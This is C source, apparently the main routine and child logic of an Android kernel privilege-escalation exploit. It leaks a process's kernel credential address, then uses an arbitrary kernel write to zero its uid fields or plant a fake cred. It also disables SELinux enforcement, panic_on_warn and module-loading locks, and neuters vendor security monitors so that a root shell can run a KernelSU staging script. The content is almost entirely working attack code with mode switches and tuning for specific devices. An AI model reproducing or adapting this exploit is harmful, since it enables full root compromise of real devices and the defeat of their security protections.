    errno = 0;
    {
        long sg = syscall(SYS_setresgid, 0, 0, 0);

        logf("[child] setresgid(0)=%ld errno=%d\n", sg, errno);
    }
    errno = 0;
    /*
     * setuid(0) with ruid already 0 takes the "old->uid" path and only changes
     * euid, leaving suid at 2000 (resuid=0/0/2000).  setresuid(0,0,0) is
     * allowed without CAP_SETUID because every new value equals the current
     * ruid, and it normalises all three.
     */
    rep.setuid_ret = (int)syscall(SYS_setresuid, 0, 0, 0);
    rep.setuid_errno = errno;
    {
        uid_t ru = 0, eu = 0, su = 0;

        getresuid(&ru, &eu, &su);
        rep.ruid = (int)ru;
        rep.reuid = (int)eu;
        rep.rsuid = (int)su;
    }
    (void)write(4, &rep, sizeof(rep));
    close(4);
    logf("[child] setresuid(0,0,0)=%d errno=%d resuid=%d/%d/%d\n",
         rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
    if (rep.setuid_ret != 0)
    {
        logf("[-] setuid(0) failed; not running a shell\n");
        _exit(4);
    }

    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        if (!strcmp(mode, "shell"))
        {
            /* 脱离父进程的进程组：exploit 主进程退出后 worker 不能被连带清掉 */
            (void)setsid();
            /* Print id first: openRoot() waits for "uid=0(root)" before it
             * reports a usable shell, and `sh -i` alone never prints it.
             * The Cap lines answer the only question that matters after a
             * uid-only write: did exec hand us the bounding-set caps. */
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id;"
                                         " grep -E '^(Uid|Gid|Cap)'"
                                         " /proc/self/status;"
                                         " cat /proc/self/attr/current;"
                                         " exec sh /data/local/tmp/ksu_stage.sh", NULL};

            execve("/system/bin/sh", av, envp);
        }
        else
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
                                        "echo ROOT_SHELL_OK",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}

/*
 * trace_pipe_raw discards new events once a per-cpu buffer is full, and the
 * spray itself generates two page events per 8 KiB write.  A small buffer
 * turns a lost page_alloc record into a false "burst missed", so raise it
 * while raising is permitted and report what is actually in use.
 */
static void bump_trace_buffer(void)
{
    char b[32] = {0};
    int cur = -1;
    int fd = open(TR "/buffer_size_kb", O_RDONLY);

    if (fd >= 0)
    {
        if (read(fd, b, sizeof(b) - 1) > 0)
            cur = atoi(b);
        close(fd);
    }
    if (cur > 0 && cur < 8192)
    {
        char v[16];

        snprintf(v, sizeof(v), "%d", 8192);
        wr(TR "/buffer_size_kb", v);
        logf("[+] buffer_size_kb %d -> 8192 (best effort)\n", cur);
        return;
    }
    logf("[+] buffer_size_kb=%d\n", cur);
}

int main(int argc, char **argv)
{
    unsigned char *raw;
    int shell_mode = 0, leak_only = 0, ids_only = 0;
    const char *conf_path = NULL;
    const char *mode = NULL;
    int argi = 1;

    setvbuf(stdout, NULL, _IONBF, 0);

    /* child re-exec with "wait": block and report, no conf needed */
    if (argc > 1 && !strcmp(argv[1], "wait"))
        return wait_child_main(argc > 2 ? argv[2] : "verify");

    /* rootd 客户端：timer rootd '<cmd>'，不需要 conf，也不需要 root */
    if (argc > 1 && !strcmp(argv[1], "rootd"))
    {
        char cmd[4000];
        size_t n = 0;

        for (int i = 2; i < argc && n + 1 < sizeof(cmd); i++)
        {
            size_t l = strlen(argv[i]);

            if (n)
                cmd[n++] = ' ';
            if (l > sizeof(cmd) - 1 - n)
                l = sizeof(cmd) - 1 - n;
            memcpy(cmd + n, argv[i], l);
            n += l;
        }
        cmd[n] = 0;
        return rootd_client(cmd);
    }

    /* victim re-exec with empty argv[0] (UAF trigger) */
    if (argv[0] && argv[0][0] == '\0')
        _exit(42);

    if (argi < argc && !strcmp(argv[argi], "--conf"))
    {
        if (argi + 1 >= argc)
        {
            fprintf(stderr,
                    "usage: %s --conf <conf> [ids|leak|shell|fake] [cpu N]\n",
                    argv[0] ? argv[0] : "timer");
            return 1;
        }
        conf_path = argv[argi + 1];
        argi += 2;
    }
    if (argi < argc)
        mode = argv[argi++];

    if (mode)
    {
        if (!strcmp(mode, "shell"))
            shell_mode = 1;
        else if (!strcmp(mode, "leak"))
            leak_only = 1;
        else if (!strcmp(mode, "ids"))
            ids_only = 1;
        else if (!strcmp(mode, "fake"))
            g_fake_stage = 1;
        else if (!strcmp(mode, "cpu") && argi < argc)
            g_cpu = atoi(argv[argi]);
    }

    if (!conf_path)
    {
        fprintf(stderr,
                "usage: %s --conf <conf> [ids|leak|shell|fake] [cpu N]\n",
                argv[0] ? argv[0] : "timer");
        return 1;
    }
    if (load_conf(conf_path))
        return 1;

    raw = malloc(48u << 20);
    if (!raw)
    {
        logf("[-] cannot allocate the 48 MiB trace buffer\n");
        return 1;
    }

    {
        struct rlimit rl;

        if (!getrlimit(RLIMIT_NOFILE, &rl))
        {
            rl.rlim_cur = rl.rlim_max;
            if (rl.rlim_cur > 65536)
                rl.rlim_cur = 65536;
            (void)setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    pin(g_cpu);
    logf("[+] pid=%d cpu=%d\n", getpid(), g_cpu);
    bump_trace_buffer();
    enable_events();
    kick_rss();
    usleep(50000);

    if (discover_page_types(raw) != 0)
        return 1;
    if (ids_only)
        return 0;

    g_base = calibrate_base(raw);
    if (!g_base)
    {
        logf("[-] base calibration failed\n");
        return 1;
    }
    prefill_timers(PREFILL_TIMERS);

    pid_t C = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long R = leak_cred(raw, &C, &go_fd, &st_fd, shell_mode,
                                     &g_child_task);
    if (!R)
    {
        logf("[-] cred leak failed\n");
        return 1;
    }
    logf("[+] child=%d cred=%#llx target=%#llx (uid_off=%#llx)\n", C, R,
         R + g_cfg.cred_uid_off, g_cfg.cred_uid_off);
    if (leak_only)
    {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[+] leak-only run complete\n");
        return 0;
    }
    /* KEEP_STAGE：不要覆盖 /data/local/tmp/ksu_stage.sh（外面已经放好自定义负载） */
    if (g_fake_stage && !getenv("KEEP_STAGE"))
        write_ksu_script();
    ensure_pool();
    ensure_raw();

    if (!g_fake_stage)
    {
        struct plant_res r;
        memset(&r, 0, sizeof(r));
        for (int a = 0; a < 3 && !r.ok; a++)
        {
            logf("[+] plant attempt %d/3\n", a + 1);
            run_plant(R + g_cfg.cred_uid_off, 1, 0, &r, raw);
        }
        if (!r.ok)
            park_forever("no successful plant");
        /*
         * 0.83-cg：shell 路线再补一次 cap_effective。
         *
         * uid 清完之后 execve 会按 effective = permitted & bset 重算，而
         * shell 的 bset 被裁到 0xc0，exec 之后 caps 一定是空的。要写
         * /sys/fs/cgroup/cgroup.procs（0775 system:system）把进程迁出
         * adbd 的 uid_0/pid_* 子树，唯一的办法是在 exec 之前先拿到
         * CAP_DAC_OVERRIDE，趁它还在完成迁移。
         *
         * 值取 V+0x7f（mode=4 里改的），低 3 位 = 111，bit1 必然命中，
         * 所以正常情况下第一轮就过；循环只是兜底。
         */
        if (getenv("PRE_CG"))
        {
            struct plant_res cr;
            static const unsigned long long capoff = 0x38;
            int att = 0;

            memset(&cr, 0, sizeof(cr));
            g_aw_value = 0;
            for (; att < 8; att++)
            {
                memset(&cr, 0, sizeof(cr));
                if (stage_write(R + capoff, 4, "cap_eff", raw, &cr))
                {
                    logf("[cap] plant 失败，重来\n");
                    continue;
                }
                if (cr.A & (1ULL << 1))
                    break;
                logf("[cap] cred+0x38 <- %#llx 无 DAC_OVERRIDE，重来\n", cr.A);
            }
            if (att >= 8)
                logf("[!] cap_eff 未拿到 CAP_DAC_OVERRIDE\n");
            else
                logf("[+] cap_eff=%#llx (DAC_OVERRIDE 命中 att=%d)\n",
                     cr.A, att + 1);
        }
    }
    else
    {
        struct plant_res fc;

        if (!g_child_task)
            park_forever("child task not leaked");
        memset(&fc, 0, sizeof(fc));
        /*
         * 0.52 的顺序（每一步都有理由）：
         *   ① probe  —— 无害零写，只为让 run_plant 内部算出 g_slide
         *   ② panic_on_warn 清零 —— fake cred 的 pc==node 一定会触发
         *      timerqueue_del 的 WARN，panic_on_warn=1 时会当场 panic
         *   ③ fake cred —— 叠在 node 上（唯一能让清理循环自然结束的形状）
         */
        if (!g_slide)
        {
            struct plant_res pr;
            int a;

            memset(&pr, 0, sizeof(pr));
            for (a = 0; a < 3 && !g_slide; a++)
                run_plant(0, a + 1, 3, &pr, raw);
            logf("[+] slide=%#llx (probe)\n", g_slide);
        }
        if (!g_slide)
            park_forever("no KASLR slide");
        {
            int pow = read_panic_on_warn();

            /*
             * SKIP_PANIC_STAGE：不发 panic_on_warn 的零写。
             * 这个地址是从镜像推出来的，如果偏了就是往内核 .data 里乱写 8 字节，
             * 观测上有几次重启正好落在这个阶段，先关掉它做对照。
             */
            if (getenv("SKIP_PANIC_STAGE"))
                logf("[!] SKIP_PANIC_STAGE: 跳过 panic_on_warn 零写\n");
            else if (pow != 0 && g_cfg.panic_on_warn)
            {
                if (stage_write(g_cfg.panic_on_warn + g_slide, 0,
                                "panic_on_warn", raw, NULL))
                    logf("[!] 无法清零 panic_on_warn，继续（WARN 可能 panic）\n");
                else if (pow < 0)
                    logf("[+] panic_on_warn zero-written (value unreadable)\n");
                else
                    logf("[+] panic_on_warn cleared (was %d)\n", pow);
                (void)read_panic_on_warn();
            }
        }
        if (getenv("CAPS_ONLY"))
        {
            /*
             * 只给 caps、不改 uid。
             *
             * 动机：厂商监控（oplus_app_monitor.ko）在进程 uid 变 0 并开始
             * 运行的一瞬间就 SIGKILL，原地清 uid 的路子走不通。但只提权
             * capability、把 uid 留在 2000，判定条件不满足，进程能活。
             *
             * 写原语是 mode=2：把 node 地址（0xffffff8xxxxxxxxx）写进目标。
             * cap[0] 是低 32 位、cap[1] 是高 32 位，低 32 位对我们来说是随机的，
             * 所以要按位筛：只接受同时含 CAP_DAC_OVERRIDE(1) 和
             * CAP_SYS_MODULE(16) 的值，反复重试直到命中。
             */
            /*
             * 0x30 cap_permitted / 0x38 cap_effective / 0x40 cap_bset。
             * 必须连 bset 一起写：execve 会按 bset 重算 permitted/effective，
             * 只写前两个的话 exec 之后就只剩原 bset（0x8000c0），
             * CAP_SYS_MODULE 会丢。
             */
            /*
             * 0.82-aw：改用 mode=4 的任意写，直接写 fullcap 常量。
             *
             * 以前靠 mode=2 写 node 地址，cap 值 = 0xffffff8xxxxxxx，只有
             * bit16 靠运气；而且 5.15.123 的 bounding set 被裁到 0xc0，
             * 只改 permitted 没用，cap_bset 必须一起抬到 fullcap 才过得去
             * execve 的 cap 重算。三个槽都写，写的是确定值，不用再赌。
             */
            /*
             * 只写 cap_effective（0x38）。delete_module 走的是 capable()，
             * 只看 effective；worker 是 euid 2000 + 无 file caps，execve 不会
             * 重算 caps，所以写这一个槽就够。
             * 写入值必然是一个内核地址（任意写的 child 必须可写），bit16
             * 由该页地址决定，命中率约 1/2 —— 没中就再 plant 一次，最多 8 次。
             */
            static const unsigned long long slots[] = {0x38};
            const unsigned long long need = (1ULL << 16);

            memset(&fc, 0, sizeof(fc));
            fc.A = 0;
            for (unsigned k = 0; k < sizeof(slots) / sizeof(slots[0]); k++)
            {
                int got = 0;

                for (int att = 0; att < 8 && !got; att++)
                {
                    struct plant_res cr;

                    memset(&cr, 0, sizeof(cr));
                    if (stage_write(R + slots[k], 4, "caps_aw", raw, &cr))
                        continue;
                    if ((cr.A & need) != need)
                    {
                        logf("[caps] cred+%#llx <- %#llx bit16=0，重来\n",
                             slots[k], cr.A);
                        continue;
                    }
                    logf("[caps] cred+%#llx <- %#llx (bit16 命中 att=%d)\n",
                         slots[k], cr.A, att + 1);
                    got = 1;
                }
                if (!got)
                    logf("[!] caps cred+%#llx 未命中\n", slots[k]);
            }
            /*
             * caps 写完之后才清 SELinux：清完 safecenter 十几秒内会强制重启，
             * 必须放在所有 plant 之后，紧接着让 worker 去 rmmod。
             */
            if (!getenv("SKIP_SELINUX"))
            {
                if (stage_write(g_cfg.selinux_state + g_slide - 7, 0,
                                "selinux", raw, NULL))
                    logf("[!] selinux 清零失败，rmmod 会被 SELinux 拦\n");
                else
                    logf("[+] selinux after write: enforce=%d\n",
                         selinux_enforcing());
            }
            if (getenv("ZERO_MODDIS"))
            {
                /*
                 * modules_disabled 是个 int（内核 .bss），init_module 里
                 * `if (!capable(CAP_SYS_MODULE) || modules_disabled) return -EPERM;`
                 * 是全系统模块加载的总闸。写原语只能整 8 字节写，所以按 8 对齐
                 * 往下取整，会连带清掉前一个 int（大概率是 padding）。
                 * 地址来自 5.15.123 的符号表（kallsyms modules_disabled）。
                 */
                unsigned long long md =
                    0xffffffc00ad1892cULL + g_slide;

                md &= ~7ULL;
                logf("[moddis] zero-write %#llx\n", md);
                if (stage_write(md, 0, "modules_disabled", raw, NULL))
                    logf("[!] modules_disabled 清零失败\n");
                else
                    logf("[+] modules_disabled 已清零\n");
            }
        }
        else if (getenv("CRED_INPLACE"))
        {
            /*
             * 不伪造 cred 页，直接原地改这份真实 cred。
             *
             * 好处：
             *  - cred 和 real_cred 指向同一个对象，改完两者一致，
             *    后面 setresuid/commit_creds 的 BUG_ON(cred != old) 不会触发；
             *  - security blob 是内核自己分配的合法对象，LSM 检查不会崩
             *    （5.15 + PANIC_ON_OOPS=y 下，伪造 blob 会直接 panic 重启）。
             *
             * 只清 uid/gid、suid/sgid、euid/egid 三组（cred+0x04..0x1b）。
             * euid==0 且 securebits 未设 NOROOT 时，execve 会按 root 规则
             * 把 cap_permitted/effective 补成 bset 全集，所以不用单独写 caps。
             * fsuid 保持原值，exec 后有 CAP_DAC_OVERRIDE 兜底。
             */
            static const unsigned long long coff[] = {0x04, 0x0c, 0x14};
            int ci_ok = 1;

            memset(&fc, 0, sizeof(fc));
            fc.A = 0;
            for (unsigned k = 0; k < sizeof(coff) / sizeof(coff[0]); k++)
            {
                logf("[inplace] zero cred+%#llx = %#llx\n", coff[k], R + coff[k]);
                if (stage_write(R + coff[k], 0, "cred_zero", raw, NULL))
                {
                    ci_ok = 0;
                    logf("[!] inplace cred+%#llx 失败\n", coff[k]);
                }
            }
            logf("[inplace] uid/suid/euid 清零 %s (cred=%#llx)\n",
                 ci_ok ? "完成" : "部分失败", R);
        }
        else if (getenv("PROBE_CRED_ZERO"))
        {
            memset(&fc, 0, sizeof(fc));
            fc.A = 0;
            logf("[probe] zero-write cred+4 = %#llx (R=%#llx)\n",
                 R + g_cfg.cred_uid_off, R);
            if (stage_write(R + g_cfg.cred_uid_off, 0, "probe_cred", raw, NULL))
                park_forever("probe cred write failed");
        }
        else if (getenv("PROBE_OFF_ZERO"))
        {
            unsigned long long po =
                strtoull(getenv("PROBE_OFF_ZERO"), NULL, 0);

            memset(&fc, 0, sizeof(fc));
            fc.A = 0;
            logf("[probe] zero-write %#llx (task+%#llx)\n",
                 g_child_task + po, po);
            if (stage_write(g_child_task + po, 0, "probe_off", raw, NULL))
                park_forever("probe zero write failed");
        }
        else if (getenv("SKIP_FAKE"))
        {
            memset(&fc, 0, sizeof(fc));
            fc.A = 0;
            logf("[!] SKIP_FAKE: 不写 task->cred，只验证唤醒链路\n");
        }
        else if (stage_write(g_child_task +
                                 (getenv("FAKE_OFF")
                                      ? strtoull(getenv("FAKE_OFF"), NULL, 0)
                                      : g_cfg.task_cred_off),
                             2, "fake_cred", raw, &fc))
            park_forever("fake cred write failed");
        if (getenv("DUAL_CRED"))
        {
            /*
             * 5.15 的 task_struct 里 real_cred/cred 是两个相邻槽位：0x790 被
             * /proc 读到，0x798 被 getuid() 读到（__arm64_sys_getuid 里
             * ldr x8,[x8,#0x798]）。只改一个的话进程自己的凭据不变，
             * 所以两个都指向 fake cred（两份内容相同，只是各来自一次 plant）。
             */
            struct plant_res fc2;

            memset(&fc2, 0, sizeof(fc2));
            if (stage_write(g_child_task + 0x798, 2, "fake_cred2", raw, &fc2))
                logf("[!] real_cred 侧 fake cred 写入失败，继续\n");
            else
                logf("[+] dual cred: %#llx / %#llx\n", fc.A, fc2.A);
        }
        logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
             g_cfg.selinux_state + g_slide);
        if (selinux_enforcing() == 0)
            logf("[+] selinux already permissive; skipping that plant\n");
        else if (getenv("SKIP_SELINUX"))
        {
            /*
             * 调试用：不改 selinux_state.enforcing。
             * fake cred 的 security blob 四个 sid 已经写成 SECINITSID_KERNEL，
             * 理论上进程换 cred 之后就是 kernel 域，不依赖全局 permissive。
             * 关 enforcing 会被 ColorOS 安全监控判定为破坏并强制重启，
             * 所以真机验证优先走这条路。
             */
            logf("[!] SKIP_SELINUX: 保持 enforcing=%d，靠 fake blob 的 kernel sid\n",
                 selinux_enforcing());
        }
        else if (stage_write(g_cfg.selinux_state + g_slide - 7, 0,
                             "selinux", raw, NULL))
            park_forever("selinux write failed");
        else
            logf("[+] selinux after write: enforce=%d\n", selinux_enforcing());
        if (g_cfg.cred_uid_off != 4 &&
            stage_write(fc.A + g_cfg.cred_uid_off, 0, "fake_uid", raw, NULL))
            park_forever("fake uid fix failed");
        logf("[+] fake cred armed: task=%#llx cred=%#llx mode=fake\n",
             g_child_task + g_cfg.task_cred_off, fc.A);
        /*
         * vivo：把 __tracepoint_sys_exit 的 funcs 清零。必须赶在 worker exec
         * ksud 之前做完，否则 root 一出现，ksud / su 退出时就被厂商回调杀掉
         * （"su 装好了，子进程一跑就消失"）。funcs 在 struct tracepoint 的
         * +0x48（arm64 + CONFIG_JUMP_LABEL），偏移由 vr.ko 的重定位反推，
         * 见 KSU-FEASIBILITY.md §九。非 vivo 机型 vivo_disarm_enabled() 为假，
         * 这里一次写都不会发。
         */
        if (vivo_disarm_enabled())
        {
            unsigned long long tp = g_cfg.sys_exit_tp + g_slide;

            if (stage_write(tp + 0x48, 0, "vivo_sys_exit", raw, NULL))
                logf("[!] vivo: sys_exit funcs 清零失败，继续（ksud 可能被回调杀掉）\n");
            else
                logf("[+] vivo: __tracepoint_sys_exit(%#llx).funcs = NULL\n", tp);
        }
    }
    logf("[+] cred writes landed, waking child\n");

    if (getenv("SURVIVE_PROBE"))
    {
        /*
         * 量“uid 变 0 之后还能活多久”。不唤醒子进程，纯观察 /proc。
         * 如果几十毫秒内就消失，说明是厂商监控在轮询 /proc 杀 uid=0 的
         * shell 进程，那就必须先干掉监控再提权；如果一直活着，说明
         * 之前的 SIGKILL 来自别处（coredump 组退出 / 我们自己 kill）。
         */
        int k;

        for (k = 0; k < 120; k++)
        {
            char p2[64];
            struct stat stt;

            snprintf(p2, sizeof(p2), "/proc/%d/stat", C);
            if (stat(p2, &stt) != 0)
            {
                logf("[survive] child GONE (reaped) after %d ms\n", k * 50);
                break;
            }
            /*
             * stat 存在不代表活着：没被 reap 的僵尸也会留着 /proc 项。
             * 读 state 字段，Z 就是已经死了。
             */
            {
                int fd2 = open(p2, O_RDONLY);
                char bb[256];
                int nn = fd2 >= 0 ? (int)read(fd2, bb, sizeof(bb) - 1) : -1;

                if (fd2 >= 0)
                    close(fd2);
                if (nn > 0)
                {
                    char *rp = strrchr(bb, ')');

                    if (rp && rp[1] == ' ')
                    {
                        char st = rp[2];

                        if (st == 'Z')
                        {
                            logf("[survive] child became ZOMBIE at %d ms (already dead)\n",
                                 k * 50);
                            break;
                        }
                        if (k == 0 || k % 20 == 0)
                            logf("[survive] t=%dms state=%c\n", k * 50, st);
                    }
                }
            }
            usleep(50000);
        }
        if (k == 120)
            logf("[survive] child still alive after 6000 ms\n");
    }

    {
        int ws = 0;
        pid_t w = waitpid(C, &ws, WNOHANG);

        if (w == C)
            logf("[!] child %d already dead before wake: st=%#x\n", C, ws);
        else if (kill(C, 0))
            logf("[!] child %d kill(0) errno=%d\n", C, errno);
        else
            logf("[+] child %d alive before wake\n", C);
    {
        char path[64], buf[4096];
        int fd;

        snprintf(path, sizeof(path), "/proc/%d/status", C);
        fd = open(path, O_RDONLY);
        if (fd >= 0)
        {
            int n = (int)read(fd, buf, sizeof(buf) - 1);

            close(fd);
            if (n > 0)
            {
                char *q;

                buf[n] = 0;
                q = strstr(buf, "Uid:");
                if (q)
                {
                    char *e = strchr(q, '\n');

                    if (e)
                        *e = 0;
                    logf("[probe] %s\n", q);
                }
                q = strstr(buf, "Name:");
                if (q)
                {
                    char *e = strchr(q, '\n');

                    if (e)
                        *e = 0;
                    logf("[probe] %s\n", q);
                }
                q = strstr(buf, "CapEff:");
                if (q)
                {
                    char *e = strchr(q, '\n');

                    if (e)
                        *e = 0;
                    logf("[probe] %s\n", q);
                }
            }
        }
    }
    }
    {
        const char *gate = getenv("GATE_FILE");

        if (gate && *gate)
        {
            int gf = open(gate, O_WRONLY | O_CREAT | O_TRUNC, 0666);

            if (gf >= 0)
            {
                write(gf, "1", 1);
                close(gf);
                logf("[+] gate opened: %s\n", gate);
            }
            else
                logf("[!] gate open failed errno=%d\n", errno);
        }
        else if (write(go_fd, "A", 1) != 1)
            logf("[!] child wake write failed\n");
    }
    close(go_fd);

    {
        struct child_report rep;
        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
        ssize_t rn = -1;

        if (poll(&pf, 1, 10000) > 0)
            rn = read(st_fd, &rep, sizeof(rep));
        close(st_fd);
        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
        {
            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                 rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
                 rep.ruid, rep.reuid, rep.rsuid);
            if (rep.setuid_ret != 0 || rep.reuid != 0)
                logf("[!] child did not reach euid 0\n");
        }
        else
        {
            logf("[!] child report missing (n=%zd)\n", rn);
        }
    }

    {
        int st = 0;
        siginfo_t si;

        /*
         * 先不 reap：用 waitid(WNOWAIT) 读 siginfo，判断 SIGKILL 是谁发的。
         *   si_code = SI_KERNEL(0x80)  -> 内核 make_task_dead / oops
         *   si_code = SI_USER(0)/SI_TKILL(-6) -> 用户态进程，si_pid 就是凶手
         * 这一步决定后面是查内核 oops 还是查被谁杀。
         */
        memset(&si, 0, sizeof(si));
        if (waitid(P_PID, (id_t)C, &si, WEXITED | WNOWAIT | WNOHANG) == 0 &&
            si.si_pid)
            logf("[!] child si_code=%d (%s) si_pid=%d si_status=%d\n",
                 si.si_code,
                 si.si_code == SI_USER ? "SI_USER" :
                 si.si_code == SI_TKILL ? "SI_TKILL" :
                 si.si_code == SI_KERNEL ? "SI_KERNEL" : "?",
                 (int)si.si_pid, si.si_status);
        if (waitpid(C, &st, 0) == C)
            logf("[+] child exit status=%#x\n", st);
    }
    if (g_fake_stage)
        park_forever("fake cred page held; reboot to clean");
    if (g_held)
        park_forever("root shell finished; failed-plant zombies are held");
    logf("[+] done\n");
    return 0;
}
